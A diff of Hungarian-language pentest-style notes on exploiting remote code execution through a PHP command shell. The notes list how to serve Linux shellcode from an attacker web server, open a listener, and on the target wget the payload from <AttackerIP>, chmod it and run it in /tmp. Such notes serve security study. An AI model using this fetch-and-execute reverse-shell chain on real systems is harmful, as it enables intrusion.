@@ -71,14 +71,16 @@ command shell:
    print_r($output);
    ?>
 
-RCE (Remote Code Execution) kihasználása:
+RCE (Remote Code Execution) sérülékenység kihasználása:
  - előfeltételek:
-   - Attacker gépen OS shellkód készítése (nekünk linux x64)
-   - Attacker gépen listener nyitása
+   - Attacker gépen OS shellkód készítése (célpont OS-ére, nekünk linux x64)
    - Attacker gépen: python3 -m http.server (port) -- webszerver nyitása !!abból a mappából ahol a shellkód van!!
+   - Attacker gépen listener nyitása (külön terminálban kényelmesebb)
  - CMD rész: (lépések között ls -l /tmp -vel tesztelhetjük a mappastruktúrát)
    - cd /tmp -- olyan mappa ahol van jogosultságunk letölteni
    - rm -f /tmp/shell.elf -- shell neve változhat
    - wget http://<AttackerIP>:<előfeltétel portja, alapból 8000>/shell.elf
    - chmod +x /tmp/shell.elf
    - /tmp/shell.elf
+
+Fenti parancsok egy php fájlba, ami githubon is fent van.
